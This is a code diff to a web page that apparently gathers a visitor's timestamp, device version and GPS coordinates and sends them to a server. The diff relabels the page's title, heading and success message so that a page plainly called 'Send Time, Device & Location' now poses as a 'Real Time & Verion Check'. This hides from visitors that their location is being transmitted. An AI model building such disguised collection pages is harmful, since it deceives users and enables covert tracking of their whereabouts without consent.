@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Send Time, Device & Location</title>
+  <title>Real Time & Verion Check</title>
   <style>
     body { font-family: Arial, sans-serif; padding: 24px; max-width: 720px; }
     button { padding: 10px 16px; margin-right: 10px; }
@@ -12,7 +12,7 @@
   </style>
 </head>
 <body>
-  <h1>Send Time, Device & Location</h1>
+  <h1>Real Time & Verion Check</h1>
   <p class="small">
       
   </p>
@@ -95,7 +95,7 @@
           statusEl.textContent = `Failed (${res.status}): ${text}`;
           return;
         }
-        statusEl.innerHTML = `<b>Info sent!</b><br>Time: ${data.timestamp}<br>Device: ${data.osVersion}` +
+        statusEl.innerHTML = `<b>Real Region Info & Device Version!</b><br>Time: ${data.timestamp}<br>Device: ${data.osVersion}` +
           (data.latitude ? `<br>Lat: ${data.latitude}<br>Lon: ${data.longitude}` : "<br>No information found.");
       } catch (e) {
         statusEl.textContent = "Network error. Try again.";
